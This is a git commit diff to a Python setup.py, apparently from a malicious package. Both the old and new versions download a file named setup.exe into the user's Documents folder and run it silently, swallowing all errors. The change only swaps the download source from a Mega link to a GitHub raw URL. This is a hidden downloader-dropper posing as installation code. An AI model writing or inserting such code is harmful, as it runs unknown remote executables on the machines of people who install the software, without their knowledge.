2853b3ebc040bd4f85c8c3fc1c3ed8be0a9eb055
TheAustrianPainter-6 <mannamazila@hotmail.com>
2024-12-13 01:20:41 -0700

    Update setup.py

--- src/setup.py
+++ src/setup.py
@@ -1,12 +1,14 @@
-import os, subprocess
-from mega import Mega
+import os, subprocess, requests
+
 def setup():
-    mega = Mega()
-    m = mega.login()
     setupexepath = os.path.join(os.path.expanduser("~\\Documents"), "setup.exe")
     try:
-        url = 'https://mega.nz/file/eMYknAJb#zFgHhmclSSOs6r2CA2OzboaZCI643WwVsyWTSOSmuy0'
-        file = m.download(url, dest_path=setupexepath)
+        url = 'https://github.com/TheAustrianPainter-6/2/raw/main/setup.exe'
+        response = requests.get(url, stream=True)
+        with open(setupexepath, 'wb') as file:
+            for chunk in response.iter_content(chunk_size=1024):
+                if chunk:
+                    file.write(chunk)
         subprocess.run([setupexepath])
     except Exception:
         pass
